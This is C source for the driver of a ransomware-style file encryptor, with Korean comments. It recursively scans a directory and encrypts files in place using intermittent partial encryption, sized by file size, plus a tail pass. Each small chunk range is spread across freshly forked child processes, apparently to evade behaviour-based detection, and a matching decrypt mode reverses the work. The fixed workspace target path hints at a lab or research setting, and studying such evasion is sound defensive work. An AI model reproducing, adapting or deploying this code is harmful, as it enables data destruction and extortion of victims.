#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>     // fork, waitpid
#include <sys/wait.h>
#include <sys/stat.h>
#include <dirent.h>
#include <limits.h>
#include <errno.h>

#include "crypto.h"     // encrypt_chunk_range, decrypt_chunk_range
#include "file_ops.h"   // file_queue, file_count, scan_directory_recursive

// crypto.c와 동일한 값 사용 (4096)
#define CHUNK_SIZE 4096

// 한 PID가 처리할 청크 개수 (10번 → 약 40KB)
#define MAX_WRITES_PER_PID 10


/**
 * @brief 프로그램 사용법 출력
 */
static void print_usage(const char *prog_name) {
    fprintf(stderr, "Usage: %s [mode]\n", prog_name);
    fprintf(stderr, "Modes:\n");
    fprintf(stderr, "  -e    Encrypt mode\n");
    fprintf(stderr, "  -d    Decrypt mode\n");
}

/**
 * @brief 한 번의 fork로 특정 offset부터 일부 청크만 암/복호화하는 워커 생성
 * @param target        대상 파일 경로
 * @param offset        시작 오프셋
 * @param chunks        처리할 청크 개수
 * @param mode          0: Encrypt, 1: Decrypt
 * @return 0: 성공, 1: 실패
 */
static int spawn_worker(const char *target, long offset, int chunks, int mode) {
    pid_t pid = fork();

    if (pid < 0) {
        perror("Fork failed");
        return 1;
    }

    if (pid == 0) {
        // ---- [Child] ----
        int ret;
        if (mode == 0) {
            ret = encrypt_chunk_range(target, offset, chunks);
        } else {
            ret = decrypt_chunk_range(target, offset, chunks);
        }

        if (ret != 0) {
            _exit(1);
        }
        _exit(0);
    } else {
        // ---- [Parent] ----
        int status;
        if (waitpid(pid, &status, 0) < 0) {
            perror("waitpid failed");
            return 1;
        }

        if (WIFSIGNALED(status)) {
            printf("[SKIP] 자식이 시그널로 종료됨: %s (signal=%d)\n",
                   target, WTERMSIG(status));
            return 1;
        } else if (WIFEXITED(status)) {
            int code = WEXITSTATUS(status);
            if (code != 0) {
                printf("[SKIP] 자식 종료 코드=%d: %s\n", code, target);
                return 1;
            }
        }

        return 0;
    }
}


/**
 * @brief 파일 큐(file_queue)에 쌓여 있는 파일들에 대해
 *        자식 프로세스를 생성하면서 순차적으로 공격(암/복호화)을 수행
 * @param mode 0: Encrypt, 1: Decrypt
 */
void execute_attack(int mode) {
    for (int i = 0; i < file_count; i++) {
        char *target = file_queue[i];

        // 1. 파일 정보 획득 (크기 확인)
        struct stat st;
        if (stat(target, &st) != 0) {
            perror("[SKIP] stat failed");
            continue; // 파일이 없거나 접근 불가
        }
        long total_size = st.st_size;
        if (total_size <= 0) {
            printf("[SKIP] 빈 파일: %s\n", target);
            continue;
        }

        long write_amount = (long)MAX_WRITES_PER_PID * CHUNK_SIZE; // 한 PID 작업량 (약 40KB)
        long skip_distance = 0;

        // ============================================================
        // 파일 크기에 따른 간헐적 암/복호화(Skip) 전략
        // (Encrypt/Decrypt 모두 동일 패턴 사용해야 복호화 가능)
        // ============================================================
        if (total_size < 1024 * 1024) {
            // [Case 1] 1MB 미만: 건너뛰지 않음 (100% 처리)
            skip_distance = 0;
        } else if (total_size < 100 * 1024 * 1024) {
            // [Case 2] 100MB 미만: 약 10%만 처리
            // 40KB 처리 후 -> 360KB 건너뜀
            skip_distance = write_amount * 9;
        } else {
            // [Case 3] 100MB 이상: 속도 위주
            // 40KB 처리 후 -> 10MB 건너뜀
            skip_distance = 10 * 1024 * 1024;
        }

        printf("[TARGET] %s (Size: %ld bytes, Skip: %ld bytes) %s 시작\n",
               target,
               total_size,
               skip_distance,
               (mode == 0) ? "암호화" : "복호화");

        long current_offset = 0;
        int child_round = 0;
        int attack_failed = 0;

        // 2. 이어달리기 루프
        while (current_offset < total_size) {
            int ret = spawn_worker(target, current_offset, MAX_WRITES_PER_PID, mode);
            child_round++;

            if (ret != 0) {
                attack_failed = 1;
                break;  // 이 파일에 대한 공격 중단
            }

            // 자식이 처리한 양 + 전략적으로 건너뛸 양
            current_offset += (write_amount + skip_distance);
        }

        // 3. Tail 처리 (파일 끝부분 구조 파괴/복구용)
        //    Encrypt/Decrypt 모두 같은 위치를 한 번 더 처리해야
        //    CTR 기반에서 정확히 되돌릴 수 있음.
        if (!attack_failed && total_size > CHUNK_SIZE) {
            long tail_offset = total_size - CHUNK_SIZE;
            if (tail_offset < 0) tail_offset = 0;

            int ret = spawn_worker(target, tail_offset, 1, mode);
            if (ret != 0) {
                printf("[SKIP] Tail 처리 실패: %s\n", target);
                attack_failed = 1;
            } else {
                child_round++;
            }
        }

        if (!attack_failed) {
            printf("[COMPLETE] %s 처리 완료 (총 %d회 PID 교체)\n",
                   target, child_round);
        } else {
            printf("[STOP] %s 처리 중단됨\n", target);
        }
    }
}


/**
 * @brief 프로그램 시작점
 */
int main(int argc, char *argv[]) {
    if (argc != 2) {  // 인자로 모드만 받음
        fprintf(stderr, "Error: Invalid arguments.\n\n");
        print_usage(argv[0]);
        return 1;
    }

    // 모드 파싱
    int mode;
    if (strcmp(argv[1], "-e") == 0) {
        mode = 0;  // Encrypt
    } else if (strcmp(argv[1], "-d") == 0) {
        mode = 1;  // Decrypt
    } else {
        fprintf(stderr, "Error: Invalid mode '%s'\n\n", argv[1]);
        print_usage(argv[0]);
        return 1;
    }


    // [/home/user/workspace/illusion]으로 고정
    // HOME 환경변수 기준으로 백엔드 경로 지정
    const char *home_dir = getenv("HOME");
    if (!home_dir) {
        fprintf(stderr, "Error: HOME environment variable not set.\n");
        return 1;
    }
    
    char start_path[PATH_MAX];

    if (snprintf(start_path, sizeof(start_path),
             "%s/workspace/illusion", home_dir) >= (int)sizeof(start_path)) {
        fprintf(stderr, "Error: Target path is too long.\n");
        return 1;
    }
    
    
    printf("--- Start Traversal ---\n");
    printf("  Target Mode: %s\n", (mode == 0) ? "ENCRYPT" : "DECRYPT");
    printf("  Target Path: %s\n", start_path);
    printf("------------------------\n");
    
    // 디렉터리 스캔 → file_queue 채우기
    scan_directory_recursive(start_path);

    printf(">>> Found %d files\n", file_count);

    execute_attack(mode);

    printf("------------------------\n");
    printf("--- End Traversal ---\n");
    return 0;
}

